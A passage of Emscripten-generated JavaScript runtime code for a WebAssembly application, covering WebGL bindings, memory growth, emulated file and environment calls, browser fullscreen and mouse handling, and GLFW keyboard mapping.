        var _emscripten_glUseProgram = program => {
            program = GL.programs[program];
            GLctx.useProgram(program);
            GLctx.currentProgram = program
        }
            ;
        var _emscripten_glValidateProgram = program => {
            GLctx.validateProgram(GL.programs[program])
        }
            ;
        var _emscripten_glVertexAttrib1f = (x0, x1) => GLctx.vertexAttrib1f(x0, x1);
        var _emscripten_glVertexAttrib1fv = (index, v) => {
            GLctx.vertexAttrib1f(index, HEAPF32[v >> 2])
        }
            ;
        var _emscripten_glVertexAttrib2f = (x0, x1, x2) => GLctx.vertexAttrib2f(x0, x1, x2);
        var _emscripten_glVertexAttrib2fv = (index, v) => {
            GLctx.vertexAttrib2f(index, HEAPF32[v >> 2], HEAPF32[v + 4 >> 2])
        }
            ;
        var _emscripten_glVertexAttrib3f = (x0, x1, x2, x3) => GLctx.vertexAttrib3f(x0, x1, x2, x3);
        var _emscripten_glVertexAttrib3fv = (index, v) => {
            GLctx.vertexAttrib3f(index, HEAPF32[v >> 2], HEAPF32[v + 4 >> 2], HEAPF32[v + 8 >> 2])
        }
            ;
        var _emscripten_glVertexAttrib4f = (x0, x1, x2, x3, x4) => GLctx.vertexAttrib4f(x0, x1, x2, x3, x4);
        var _emscripten_glVertexAttrib4fv = (index, v) => {
            GLctx.vertexAttrib4f(index, HEAPF32[v >> 2], HEAPF32[v + 4 >> 2], HEAPF32[v + 8 >> 2], HEAPF32[v + 12 >> 2])
        }
            ;
        var _emscripten_glVertexAttribDivisor = (index, divisor) => {
            GLctx.vertexAttribDivisor(index, divisor)
        }
            ;
        var _glVertexAttribDivisor = _emscripten_glVertexAttribDivisor;
        var _emscripten_glVertexAttribDivisorANGLE = _glVertexAttribDivisor;
        var _emscripten_glVertexAttribDivisorARB = _glVertexAttribDivisor;
        var _emscripten_glVertexAttribDivisorEXT = _glVertexAttribDivisor;
        var _emscripten_glVertexAttribDivisorNV = _glVertexAttribDivisor;
        var _emscripten_glVertexAttribI4i = (x0, x1, x2, x3, x4) => GLctx.vertexAttribI4i(x0, x1, x2, x3, x4);
        var _emscripten_glVertexAttribI4iv = (index, v) => {
            GLctx.vertexAttribI4i(index, HEAP32[v >> 2], HEAP32[v + 4 >> 2], HEAP32[v + 8 >> 2], HEAP32[v + 12 >> 2])
        }
            ;
        var _emscripten_glVertexAttribI4ui = (x0, x1, x2, x3, x4) => GLctx.vertexAttribI4ui(x0, x1, x2, x3, x4);
        var _emscripten_glVertexAttribI4uiv = (index, v) => {
            GLctx.vertexAttribI4ui(index, HEAPU32[v >> 2], HEAPU32[v + 4 >> 2], HEAPU32[v + 8 >> 2], HEAPU32[v + 12 >> 2])
        }
            ;
        var _emscripten_glVertexAttribIPointer = (index, size, type, stride, ptr) => {
            GLctx.vertexAttribIPointer(index, size, type, stride, ptr)
        }
            ;
        var _emscripten_glVertexAttribPointer = (index, size, type, normalized, stride, ptr) => {
            GLctx.vertexAttribPointer(index, size, type, !!normalized, stride, ptr)
        }
            ;
        var _emscripten_glViewport = (x0, x1, x2, x3) => GLctx.viewport(x0, x1, x2, x3);
        var _emscripten_glWaitSync = (sync, flags, timeout) => {
            timeout = Number(timeout);
            GLctx.waitSync(GL.syncs[sync], flags, timeout)
        }
            ;
        var getHeapMax = () => 2147483648;
        var alignMemory = (size, alignment) => Math.ceil(size / alignment) * alignment;
        var growMemory = size => {
            var oldHeapSize = wasmMemory.buffer.byteLength;
            var pages = (size - oldHeapSize + 65535) / 65536 | 0;
            try {
                wasmMemory.grow(pages);
                updateMemoryViews();
                return 1
            } catch (e) { }
        }
            ;
        var _emscripten_resize_heap = requestedSize => {
            var oldSize = HEAPU8.length;
            requestedSize >>>= 0;
            var maxHeapSize = getHeapMax();
            if (requestedSize > maxHeapSize) {
                return false
            }
            for (var cutDown = 1; cutDown <= 4; cutDown *= 2) {
                var overGrownHeapSize = oldSize * (1 + .2 / cutDown);
                overGrownHeapSize = Math.min(overGrownHeapSize, requestedSize + 100663296);
                var newSize = Math.min(maxHeapSize, alignMemory(Math.max(requestedSize, overGrownHeapSize), 65536));
                var replacement = growMemory(newSize);
                if (replacement) {
                    return true
                }
            }
            return false
        }
            ;
        var _emscripten_sample_gamepad_data = () => {
            try {
                if (navigator.getGamepads)
                    return (JSEvents.lastGamepadState = navigator.getGamepads()) ? 0 : -1
            } catch (e) {
                navigator.getGamepads = null
            }
            return -1
        }
            ;
        var _emscripten_set_main_loop = (func, fps, simulateInfiniteLoop) => {
            var iterFunc = () => dynCall_v(func);
            setMainLoop(iterFunc, fps, simulateInfiniteLoop)
        }
            ;
        var _emscripten_sleep = function (ms) {
            let innerFunc = () => new Promise(resolve => setTimeout(resolve, ms));
            return Asyncify.handleAsync(innerFunc)
        };
        _emscripten_sleep.isAsync = true;
        var ENV = {};
        var getExecutableName = () => thisProgram || "./this.program";
        var getEnvStrings = () => {
            if (!getEnvStrings.strings) {
                var lang = (globalThis.navigator?.language ?? "C").replace("-", "_") + ".UTF-8";
                var env = {
                    USER: "web_user",
                    LOGNAME: "web_user",
                    PATH: "/",
                    PWD: "/",
                    HOME: "/home/web_user",
                    LANG: lang,
                    _: getExecutableName()
                };
                for (var x in ENV) {
                    if (ENV[x] === undefined)
                        delete env[x];
                    else
                        env[x] = ENV[x]
                }
                var strings = [];
                for (var x in env) {
                    strings.push(`${x}=${env[x]}`)
                }
                getEnvStrings.strings = strings
            }
            return getEnvStrings.strings
        }
            ;
        var _environ_get = (__environ, environ_buf) => {
            var bufSize = 0;
            var envp = 0;
            for (var string of getEnvStrings()) {
                var ptr = environ_buf + bufSize;
                HEAPU32[__environ + envp >> 2] = ptr;
                bufSize += stringToUTF8(string, ptr, Infinity) + 1;
                envp += 4
            }
            return 0
        }
            ;
        var _environ_sizes_get = (penviron_count, penviron_buf_size) => {
            var strings = getEnvStrings();
            HEAPU32[penviron_count >> 2] = strings.length;
            var bufSize = 0;
            for (var string of strings) {
                bufSize += lengthBytesUTF8(string) + 1
            }
            HEAPU32[penviron_buf_size >> 2] = bufSize;
            return 0
        }
            ;
        function _fd_close(fd) {
            try {
                var stream = SYSCALLS.getStreamFromFD(fd);
                FS.close(stream);
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return e.errno
            }
        }
        var doReadv = (stream, iov, iovcnt, offset) => {
            var ret = 0;
            for (var i = 0; i < iovcnt; i++) {
                var ptr = HEAPU32[iov >> 2];
                var len = HEAPU32[iov + 4 >> 2];
                iov += 8;
                var curr = FS.read(stream, HEAP8, ptr, len, offset);
                if (curr < 0)
                    return -1;
                ret += curr;
                if (curr < len)
                    break;
                if (typeof offset != "undefined") {
                    offset += curr
                }
            }
            return ret
        }
            ;
        function _fd_read(fd, iov, iovcnt, pnum) {
            try {
                var stream = SYSCALLS.getStreamFromFD(fd);
                var num = doReadv(stream, iov, iovcnt);
                HEAPU32[pnum >> 2] = num;
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return e.errno
            }
        }
        function _fd_seek(fd, offset, whence, newOffset) {
            offset = bigintToI53Checked(offset);
            try {
                if (isNaN(offset))
                    return 61;
                var stream = SYSCALLS.getStreamFromFD(fd);
                FS.llseek(stream, offset, whence);
                HEAP64[newOffset >> 3] = BigInt(stream.position);
                if (stream.getdents && offset === 0 && whence === 0)
                    stream.getdents = null;
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return e.errno
            }
        }
        var doWritev = (stream, iov, iovcnt, offset) => {
            var ret = 0;
            for (var i = 0; i < iovcnt; i++) {
                var ptr = HEAPU32[iov >> 2];
                var len = HEAPU32[iov + 4 >> 2];
                iov += 8;
                var curr = FS.write(stream, HEAP8, ptr, len, offset);
                if (curr < 0)
                    return -1;
                ret += curr;
                if (curr < len) {
                    break
                }
                if (typeof offset != "undefined") {
                    offset += curr
                }
            }
            return ret
        }
            ;
        function _fd_write(fd, iov, iovcnt, pnum) {
            try {
                var stream = SYSCALLS.getStreamFromFD(fd);
                var num = doWritev(stream, iov, iovcnt);
                HEAPU32[pnum >> 2] = num;
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return e.errno
            }
        }
        function getFullscreenElement() {
            return document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.webkitCurrentFullScreenElement || document.msFullscreenElement
        }
        var safeSetTimeout = (func, timeout) => setTimeout(() => {
            callUserCallback(func)
        }
            , timeout);
        var warnOnce = text => {
            warnOnce.shown ||= {};
            if (!warnOnce.shown[text]) {
                warnOnce.shown[text] = 1;
                err(text)
            }
        }
            ;
        var Browser = {
            useWebGL: false,
            isFullscreen: false,
            pointerLock: false,
            moduleContextCreatedCallbacks: [],
            workers: [],
            preloadedImages: {},
            preloadedAudios: {},
            getCanvas: () => Module["canvas"],
            init() {
                if (Browser.initted)
                    return;
                Browser.initted = true;
                var imagePlugin = {};
                imagePlugin["canHandle"] = name => !Module["noImageDecoding"] && /\.(jpg|jpeg|png|bmp|webp)$/i.test(name);
                imagePlugin["handle"] = async (byteArray, name) => {
                    var b = new Blob([byteArray], {
                        type: Browser.getMimetype(name)
                    });
                    if (b.size !== byteArray.length) {
                        b = new Blob([new Uint8Array(byteArray).buffer], {
                            type: Browser.getMimetype(name)
                        })
                    }
                    var url = URL.createObjectURL(b);
                    return new Promise((resolve, reject) => {
                        var img = new Image;
                        img.onload = () => {
                            var canvas = document.createElement("canvas");
                            canvas.width = img.width;
                            canvas.height = img.height;
                            var ctx = canvas.getContext("2d");
                            ctx.drawImage(img, 0, 0);
                            Browser.preloadedImages[name] = canvas;
                            URL.revokeObjectURL(url);
                            resolve(byteArray)
                        }
                            ;
                        img.onerror = event => {
                            err(`Image ${url} could not be decoded`);
                            reject()
                        }
                            ;
                        img.src = url
                    }
                    )
                }
                    ;
                preloadPlugins.push(imagePlugin);
                var audioPlugin = {};
                audioPlugin["canHandle"] = name => !Module["noAudioDecoding"] && name.slice(-4) in {
                    ".ogg": 1,
                    ".wav": 1,
                    ".mp3": 1
                };
                audioPlugin["handle"] = async (byteArray, name) => new Promise((resolve, reject) => {
                    var done = false;
                    function finish(audio) {
                        if (done)
                            return;
                        done = true;
                        Browser.preloadedAudios[name] = audio;
                        resolve(byteArray)
                    }
                    var b = new Blob([byteArray], {
                        type: Browser.getMimetype(name)
                    });
                    var url = URL.createObjectURL(b);
                    var audio = new Audio;
                    audio.addEventListener("canplaythrough", () => finish(audio), false);
                    audio.onerror = event => {
                        if (done)
                            return;
                        err(`warning: browser could not fully decode audio ${name}, trying slower base64 approach`);
                        function encode64(data) {
                            var BASE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                            var PAD = "=";
                            var ret = "";
                            var leftchar = 0;
                            var leftbits = 0;
                            for (var i = 0; i < data.length; i++) {
                                leftchar = leftchar << 8 | data[i];
                                leftbits += 8;
                                while (leftbits >= 6) {
                                    var curr = leftchar >> leftbits - 6 & 63;
                                    leftbits -= 6;
                                    ret += BASE[curr]
                                }
                            }
                            if (leftbits == 2) {
                                ret += BASE[(leftchar & 3) << 4];
                                ret += PAD + PAD
                            } else if (leftbits == 4) {
                                ret += BASE[(leftchar & 15) << 2];
                                ret += PAD
                            }
                            return ret
                        }
                        audio.src = "data:audio/x-" + name.slice(-3) + ";base64," + encode64(byteArray);
                        finish(audio)
                    }
                        ;
                    audio.src = url;
                    safeSetTimeout(() => {
                        finish(audio)
                    }
                        , 1e4)
                }
                );
                preloadPlugins.push(audioPlugin);
                function pointerLockChange() {
                    var canvas = Browser.getCanvas();
                    Browser.pointerLock = document.pointerLockElement === canvas
                }
                var canvas = Browser.getCanvas();
                if (canvas) {
                    document.addEventListener("pointerlockchange", pointerLockChange, false);
                    if (Module["elementPointerLock"]) {
                        canvas.addEventListener("click", ev => {
                            if (!Browser.pointerLock && Browser.getCanvas().requestPointerLock) {
                                Browser.getCanvas().requestPointerLock();
                                ev.preventDefault()
                            }
                        }
                            , false)
                    }
                }
            },
            createContext(canvas, useWebGL, setInModule, webGLContextAttributes) {
                if (useWebGL && Module["ctx"] && canvas == Browser.getCanvas())
                    return Module["ctx"];
                var ctx;
                var contextHandle;
                if (useWebGL) {
                    var contextAttributes = {
                        antialias: false,
                        alpha: false,
                        majorVersion: typeof WebGL2RenderingContext != "undefined" ? 2 : 1
                    };
                    if (webGLContextAttributes) {
                        for (var attribute in webGLContextAttributes) {
                            contextAttributes[attribute] = webGLContextAttributes[attribute]
                        }
                    }
                    if (typeof GL != "undefined") {
                        contextHandle = GL.createContext(canvas, contextAttributes);
                        if (contextHandle) {
                            ctx = GL.getContext(contextHandle).GLctx
                        }
                    }
                } else {
                    ctx = canvas.getContext("2d")
                }
                if (!ctx)
                    return null;
                if (setInModule) {
                    Module["ctx"] = ctx;
                    if (useWebGL)
                        GL.makeContextCurrent(contextHandle);
                    Browser.useWebGL = useWebGL;
                    Browser.moduleContextCreatedCallbacks.forEach(callback => callback());
                    Browser.init()
                }
                return ctx
            },
            fullscreenHandlersInstalled: false,
            lockPointer: undefined,
            resizeCanvas: undefined,
            requestFullscreen(lockPointer, resizeCanvas) {
                Browser.lockPointer = lockPointer;
                Browser.resizeCanvas = resizeCanvas;
                if (typeof Browser.lockPointer == "undefined")
                    Browser.lockPointer = true;
                if (typeof Browser.resizeCanvas == "undefined")
                    Browser.resizeCanvas = false;
                var canvas = Browser.getCanvas();
                function fullscreenChange() {
                    Browser.isFullscreen = false;
                    var canvasContainer = canvas.parentNode;
                    if (getFullscreenElement() === canvasContainer) {
                        canvas.exitFullscreen = Browser.exitFullscreen;
                        if (Browser.lockPointer)
                            canvas.requestPointerLock();
                        Browser.isFullscreen = true;
                        if (Browser.resizeCanvas) {
                            Browser.setFullscreenCanvasSize()
                        } else {
                            Browser.updateCanvasDimensions(canvas)
                        }
                    } else {
                        canvasContainer.parentNode.insertBefore(canvas, canvasContainer);
                        canvasContainer.parentNode.removeChild(canvasContainer);
                        if (Browser.resizeCanvas) {
                            Browser.setWindowedCanvasSize()
                        } else {
                            Browser.updateCanvasDimensions(canvas)
                        }
                    }
                    Module["onFullScreen"]?.(Browser.isFullscreen);
                    Module["onFullscreen"]?.(Browser.isFullscreen)
                }
                if (!Browser.fullscreenHandlersInstalled) {
                    Browser.fullscreenHandlersInstalled = true;
                    document.addEventListener("fullscreenchange", fullscreenChange, false);
                    document.addEventListener("mozfullscreenchange", fullscreenChange, false);
                    document.addEventListener("webkitfullscreenchange", fullscreenChange, false);
                    document.addEventListener("MSFullscreenChange", fullscreenChange, false)
                }
                var canvasContainer = document.createElement("div");
                canvas.parentNode.insertBefore(canvasContainer, canvas);
                canvasContainer.appendChild(canvas);
                canvasContainer.requestFullscreen = canvasContainer["requestFullscreen"] || canvasContainer["mozRequestFullScreen"] || canvasContainer["msRequestFullscreen"] || (canvasContainer["webkitRequestFullscreen"] ? () => canvasContainer["webkitRequestFullscreen"](Element["ALLOW_KEYBOARD_INPUT"]) : null) || (canvasContainer["webkitRequestFullScreen"] ? () => canvasContainer["webkitRequestFullScreen"](Element["ALLOW_KEYBOARD_INPUT"]) : null);
                canvasContainer.requestFullscreen()
            },
            exitFullscreen() {
                if (!Browser.isFullscreen) {
                    return false
                }
                var CFS = document["exitFullscreen"] || document["cancelFullScreen"] || document["mozCancelFullScreen"] || document["msExitFullscreen"] || document["webkitCancelFullScreen"] || (() => { }
                );
                CFS.apply(document, []);
                return true
            },
            safeSetTimeout(func, timeout) {
                return safeSetTimeout(func, timeout)
            },
            getMimetype(name) {
                return {
                    jpg: "image/jpeg",
                    jpeg: "image/jpeg",
                    png: "image/png",
                    bmp: "image/bmp",
                    ogg: "audio/ogg",
                    wav: "audio/wav",
                    mp3: "audio/mpeg"
                }[name.slice(name.lastIndexOf(".") + 1)]
            },
            getUserMedia(func) {
                window.getUserMedia ||= navigator["getUserMedia"] || navigator["mozGetUserMedia"];
                window.getUserMedia(func)
            },
            getMovementX(event) {
                return event["movementX"] || event["mozMovementX"] || event["webkitMovementX"] || 0
            },
            getMovementY(event) {
                return event["movementY"] || event["mozMovementY"] || event["webkitMovementY"] || 0
            },
            getMouseWheelDelta(event) {
                var delta = 0;
                switch (event.type) {
                    case "DOMMouseScroll":
                        delta = event.detail / 3;
                        break;
                    case "mousewheel":
                        delta = event.wheelDelta / 120;
                        break;
                    case "wheel":
                        delta = event.deltaY;
                        switch (event.deltaMode) {
                            case 0:
                                delta /= 100;
                                break;
                            case 1:
                                delta /= 3;
                                break;
                            case 2:
                                delta *= 80;
                                break;
                            default:
                                abort("unrecognized mouse wheel delta mode: " + event.deltaMode)
                        }
                        break;
                    default:
                        abort("unrecognized mouse wheel event: " + event.type)
                }
                return delta
            },
            mouseX: 0,
            mouseY: 0,
            mouseMovementX: 0,
            mouseMovementY: 0,
            touches: {},
            lastTouches: {},
            calculateMouseCoords(pageX, pageY) {
                var canvas = Browser.getCanvas();
                var rect = canvas.getBoundingClientRect();
                var scrollX = typeof window.scrollX != "undefined" ? window.scrollX : window.pageXOffset;
                var scrollY = typeof window.scrollY != "undefined" ? window.scrollY : window.pageYOffset;
                var adjustedX = pageX - (scrollX + rect.left);
                var adjustedY = pageY - (scrollY + rect.top);
                adjustedX = adjustedX * (canvas.width / rect.width);
                adjustedY = adjustedY * (canvas.height / rect.height);
                return {
                    x: adjustedX,
                    y: adjustedY
                }
            },
            setMouseCoords(pageX, pageY) {
                const { x, y } = Browser.calculateMouseCoords(pageX, pageY);
                Browser.mouseMovementX = x - Browser.mouseX;
                Browser.mouseMovementY = y - Browser.mouseY;
                Browser.mouseX = x;
                Browser.mouseY = y
            },
            calculateMouseEvent(event) {
                if (Browser.pointerLock) {
                    if (event.type != "mousemove" && "mozMovementX" in event) {
                        Browser.mouseMovementX = Browser.mouseMovementY = 0
                    } else {
                        Browser.mouseMovementX = Browser.getMovementX(event);
                        Browser.mouseMovementY = Browser.getMovementY(event)
                    }
                    Browser.mouseX += Browser.mouseMovementX;
                    Browser.mouseY += Browser.mouseMovementY
                } else {
                    if (event.type === "touchstart" || event.type === "touchend" || event.type === "touchmove") {
                        var touch = event.touch;
                        if (touch === undefined) {
                            return
                        }
                        var coords = Browser.calculateMouseCoords(touch.pageX, touch.pageY);
                        if (event.type === "touchstart") {
                            Browser.lastTouches[touch.identifier] = coords;
                            Browser.touches[touch.identifier] = coords
                        } else if (event.type === "touchend" || event.type === "touchmove") {
                            var last = Browser.touches[touch.identifier];
                            last ||= coords;
                            Browser.lastTouches[touch.identifier] = last;
                            Browser.touches[touch.identifier] = coords
                        }
                        return
                    }
                    Browser.setMouseCoords(event.pageX, event.pageY)
                }
            },
            resizeListeners: [],
            updateResizeListeners() {
                var canvas = Browser.getCanvas();
                Browser.resizeListeners.forEach(listener => listener(canvas.width, canvas.height))
            },
            setCanvasSize(width, height, noUpdates) {
                var canvas = Browser.getCanvas();
                Browser.updateCanvasDimensions(canvas, width, height);
                if (!noUpdates)
                    Browser.updateResizeListeners()
            },
            windowedWidth: 0,
            windowedHeight: 0,
            setFullscreenCanvasSize() {
                if (typeof SDL != "undefined") {
                    var flags = HEAPU32[SDL.screen >> 2];
                    flags = flags | 8388608;
                    HEAP32[SDL.screen >> 2] = flags
                }
                Browser.updateCanvasDimensions(Browser.getCanvas());
                Browser.updateResizeListeners()
            },
            setWindowedCanvasSize() {
                if (typeof SDL != "undefined") {
                    var flags = HEAPU32[SDL.screen >> 2];
                    flags = flags & ~8388608;
                    HEAP32[SDL.screen >> 2] = flags
                }
                Browser.updateCanvasDimensions(Browser.getCanvas());
                Browser.updateResizeListeners()
            },
            updateCanvasDimensions(canvas, wNative, hNative) {
                if (wNative && hNative) {
                    canvas.widthNative = wNative;
                    canvas.heightNative = hNative
                } else {
                    wNative = canvas.widthNative;
                    hNative = canvas.heightNative
                }
                var w = wNative;
                var h = hNative;
                if (Module["forcedAspectRatio"] > 0) {
                    if (w / h < Module["forcedAspectRatio"]) {
                        w = Math.round(h * Module["forcedAspectRatio"])
                    } else {
                        h = Math.round(w / Module["forcedAspectRatio"])
                    }
                }
                if (getFullscreenElement() === canvas.parentNode && typeof screen != "undefined") {
                    var factor = Math.min(screen.width / w, screen.height / h);
                    w = Math.round(w * factor);
                    h = Math.round(h * factor)
                }
                if (Browser.resizeCanvas) {
                    if (canvas.width != w)
                        canvas.width = w;
                    if (canvas.height != h)
                        canvas.height = h;
                    if (typeof canvas.style != "undefined") {
                        canvas.style.removeProperty("width");
                        canvas.style.removeProperty("height")
                    }
                } else {
                    if (canvas.width != wNative)
                        canvas.width = wNative;
                    if (canvas.height != hNative)
                        canvas.height = hNative;
                    if (typeof canvas.style != "undefined") {
                        if (w != wNative || h != hNative) {
                            canvas.style.setProperty("width", w + "px", "important");
                            canvas.style.setProperty("height", h + "px", "important")
                        } else {
                            canvas.style.removeProperty("width");
                            canvas.style.removeProperty("height")
                        }
                    }
                }
            }
        };
        function GLFW_Window(id, width, height, framebufferWidth, framebufferHeight, title, monitor, share) {
            this.id = id;
            this.x = 0;
            this.y = 0;
            this.fullscreen = false;
            this.storedX = 0;
            this.storedY = 0;
            this.width = width;
            this.height = height;
            this.framebufferWidth = framebufferWidth;
            this.framebufferHeight = framebufferHeight;
            this.storedWidth = width;
            this.storedHeight = height;
            this.title = title;
            this.monitor = monitor;
            this.share = share;
            this.attributes = {
                ...GLFW.hints
            };
            this.inputModes = {
                208897: 212993,
                208898: 0,
                208899: 0
            };
            this.buttons = 0;
            this.keys = new Array;
            this.domKeys = new Array;
            this.shouldClose = 0;
            this.title = null;
            this.windowPosFunc = 0;
            this.windowSizeFunc = 0;
            this.windowCloseFunc = 0;
            this.windowRefreshFunc = 0;
            this.windowFocusFunc = 0;
            this.windowIconifyFunc = 0;
            this.windowMaximizeFunc = 0;
            this.framebufferSizeFunc = 0;
            this.windowContentScaleFunc = 0;
            this.mouseButtonFunc = 0;
            this.cursorPosFunc = 0;
            this.cursorEnterFunc = 0;
            this.scrollFunc = 0;
            this.dropFunc = 0;
            this.keyFunc = 0;
            this.charFunc = 0;
            this.userptr = 0
        }
        var _emscripten_set_window_title = title => document.title = UTF8ToString(title);
        var GLFW = {
            WindowFromId: id => {
                if (id <= 0 || !GLFW.windows)
                    return null;
                return GLFW.windows[id - 1]
            }
            ,
            joystickFunc: 0,
            errorFunc: 0,
            monitorFunc: 0,
            active: null,
            scale: null,
            windows: null,
            monitors: null,
            monitorString: null,
            versionString: null,
            initialTime: null,
            extensions: null,
            devicePixelRatioMQL: null,
            hints: null,
            primaryTouchId: null,
            defaultHints: {
                131073: 0,
                131074: 0,
                131075: 1,
                131076: 1,
                131077: 1,
                131082: 0,
                135169: 8,
                135170: 8,
                135171: 8,
                135172: 8,
                135173: 24,
                135174: 8,
                135175: 0,
                135176: 0,
                135177: 0,
                135178: 0,
                135179: 0,
                135180: 0,
                135181: 0,
                135182: 0,
                135183: 0,
                139265: 196609,
                139266: 1,
                139267: 0,
                139268: 0,
                139269: 0,
                139270: 0,
                139271: 0,
                139272: 0,
                139276: 0
            },
            DOMToGLFWKeyCode: keycode => {
                switch (keycode) {
                    case 32:
                        return 32;
                    case 222:
                        return 39;
                    case 188:
                        return 44;
                    case 173:
                        return 45;
                    case 189:
                        return 45;
                    case 190:
                        return 46;
                    case 191:
                        return 47;
                    case 48:
                        return 48;
                    case 49:
                        return 49;
                    case 50:
                        return 50;
                    case 51:
                        return 51;
                    case 52:
                        return 52;
                    case 53:
                        return 53;
                    case 54:
                        return 54;
                    case 55:
                        return 55;
                    case 56:
                        return 56;
                    case 57:
                        return 57;
                    case 59:
                        return 59;
                    case 61:
                        return 61;
                    case 187:
                        return 61;
                    case 65:
                        return 65;
                    case 66:
                        return 66;
                    case 67:
                        return 67;
                    case 68:
                        return 68;
                    case 69:
                        return 69;
                    case 70:
                        return 70;
                    case 71:
                        return 71;
                    case 72:
                        return 72;
                    case 73:
                        return 73;
                    case 74:
                        return 74;
                    case 75:
                        return 75;
                    case 76:
                        return 76;
                    case 77:
                        return 77;
                    case 78:
                        return 78;
                    case 79:
                        return 79;
                    case 80:
                        return 80;
                    case 81:
                        return 81;
                    case 82:
                        return 82;
                    case 83:
                        return 83;
                    case 84:
                        return 84;
                    case 85:
                        return 85;
                    case 86:
                        return 86;
                    case 87:
                        return 87;
                    case 88:
                        return 88;
                    case 89:
                        return 89;
                    case 90:
                        return 90;
                    case 219:
                        return 91;
                    case 220:
                        return 92;
                    case 221:
                        return 93;
                    case 192:
                        return 96;
                    case 27:
                        return 256;
                    case 13:
                        return 257;
                    case 9:
                        return 258;
                    case 8:
                        return 259;
                    case 45:
                        return 260;
                    case 46:
                        return 261;
                    case 39:
                        return 262;
                    case 37:
                        return 263;
                    case 40:
                        return 264;
                    case 38:
                        return 265;
                    case 33:
                        return 266;
                    case 34:
                        return 267;
                    case 36:
                        return 268;
                    case 35:
                        return 269;
                    case 20:
                        return 280;
                    case 145:
                        return 281;
                    case 144:
                        return 282;
                    case 44:
                        return 283;
                    case 19:
                        return 284;
                    case 112:
                        return 290;
                    case 113:
                        return 291;
                    case 114:
                        return 292;
                    case 115:
                        return 293;
                    case 116:
                        return 294;
                    case 117:
                        return 295;
                    case 118:
                        return 296;
                    case 119:
                        return 297;
                    case 120:
                        return 298;
                    case 121:
                        return 299;
                    case 122:
                        return 300;
                    case 123:
                        return 301;
                    case 124:
                        return 302;
                    case 125:
                        return 303;
                    case 126:
                        return 304;
                    case 127:
                        return 305;
                    case 128:
                        return 306;
                    case 129:
                        return 307;
                    case 130:
                        return 308;
                    case 131:
                        return 309;
                    case 132:
                        return 310;
                    case 133:
                        return 311;
                    case 134:
                        return 312;
                    case 135:
                        return 313;
                    case 136:
                        return 314;
                    case 96:
                        return 320;
                    case 97:
                        return 321;
                    case 98:
                        return 322;
                    case 99:
                        return 323;
                    case 100:
                        return 324;
                    case 101:
                        return 325;
                    case 102:
                        return 326;
                    case 103:
                        return 327;
                    case 104:
                        return 328;
                    case 105:
                        return 329;
                    case 110:
                        return 330;
                    case 111:
                        return 331;
                    case 106:
                        return 332;
                    case 109:
                        return 333;
                    case 107:
                        return 334;
                    case 16:
                        return 340;
                    case 17:
                        return 341;
                    case 18:
                        return 342;
                    case 91:
                        return 343;
                    case 224:
                        return 343;
                    case 93:
                        return 348;
                    default:
                        return -1
                }
            }
            ,
            getModBits: win => {
                var mod = 0;
                if (win.keys[340])
                    mod |= 1;
                if (win.keys[341])
                    mod |= 2;
                if (win.keys[342])
                    mod |= 4;
                if (win.keys[343] || win.keys[348])
                    mod |= 8;
                return mod
            }
            ,
            onKeyPress: event => {
                if (!GLFW.active || !GLFW.active.charFunc)
                    return;
                if (event.ctrlKey || event.metaKey)
                    return;
                var charCode = event.charCode;
                if (charCode == 0 || charCode >= 0 && charCode <= 31)
                    return;
                ((a1, a2) => dynCall_vii(GLFW.active.charFunc, a1, a2))(GLFW.active.id, charCode)
            }
            ,
            onKeyChanged: (keyCode, status) => {
                if (!GLFW.active)
                    return;
                var key = GLFW.DOMToGLFWKeyCode(keyCode);
                if (key == -1)
                    return;
                var repeat = status && GLFW.active.keys[key];
                GLFW.active.keys[key] = status;
                GLFW.active.domKeys[keyCode] = status;
                if (GLFW.active.keyFunc) {
                    if (repeat)
                        status = 2;
                    ((a1, a2, a3, a4, a5) => dynCall_viiiii(GLFW.active.keyFunc, a1, a2, a3, a4, a5))(GLFW.active.id, key, keyCode, status, GLFW.getModBits(GLFW.active))
                }
            }
            ,
            onGamepadConnected: event => {
                GLFW.refreshJoysticks()
            }
            ,
            onGamepadDisconnected: event => {
                GLFW.refreshJoysticks()
            }
            ,
            onKeydown: event => {
                GLFW.onKeyChanged(event.keyCode, 1);
                if (event.key == "Backspace" || event.key == "Tab") {
                    event.preventDefault()
                }
            }
            ,
            onKeyup: event => {
                GLFW.onKeyChanged(event.keyCode, 0)
            }
            ,
            onBlur: event => {
                if (!GLFW.active)
                    return;
                for (var i = 0; i < GLFW.active.domKeys.length; ++i) {
                    if (GLFW.active.domKeys[i]) {
                        GLFW.onKeyChanged(i, 0)
                    }
                }
            }
            ,
            onMousemove: event => {
                if (!GLFW.active)
                    return;
                if (event.type === "touchmove") {
                    event.preventDefault();
                    let primaryChanged = false;
                    for (let i of event.changedTouches) {
                        if (GLFW.primaryTouchId === i.identifier) {
                            Browser.setMouseCoords(i.pageX, i.pageY);
                            primaryChanged = true;
                            break
                        }
                    }
                    if (!primaryChanged) {
                        return
                    }
                } else {
                    Browser.calculateMouseEvent(event)
                }
                if (event.target != Browser.getCanvas() || !GLFW.active.cursorPosFunc)
                    return;
                if (GLFW.active.cursorPosFunc) {
                    ((a1, a2, a3) => dynCall_vidd(GLFW.active.cursorPosFunc, a1, a2, a3))(GLFW.active.id, Browser.mouseX, Browser.mouseY)
                }
            }
            ,
            DOMToGLFWMouseButton: event => {
                var eventButton = event["button"];
                if (eventButton > 0) {
                    if (eventButton == 1) {
                        eventButton = 2
                    } else {
                        eventButton = 1
                    }
                }
                return eventButton
            }
            ,
            onMouseenter: event => {
                if (!GLFW.active)
                    return;
                if (event.target != Browser.getCanvas())
                    return;
                if (GLFW.active.cursorEnterFunc) {
                    ((a1, a2) => dynCall_vii(GLFW.active.cursorEnterFunc, a1, a2))(GLFW.active.id, 1)
                }
            }
            ,
            onMouseleave: event => {
                if (!GLFW.active)
                    return;
                if (event.target != Browser.getCanvas())
                    return;
                if (GLFW.active.cursorEnterFunc) {
                    ((a1, a2) => dynCall_vii(GLFW.active.cursorEnterFunc, a1, a2))(GLFW.active.id, 0)
                }
            }
            ,
            onMouseButtonChanged: (event, status) => {
                if (!GLFW.active)
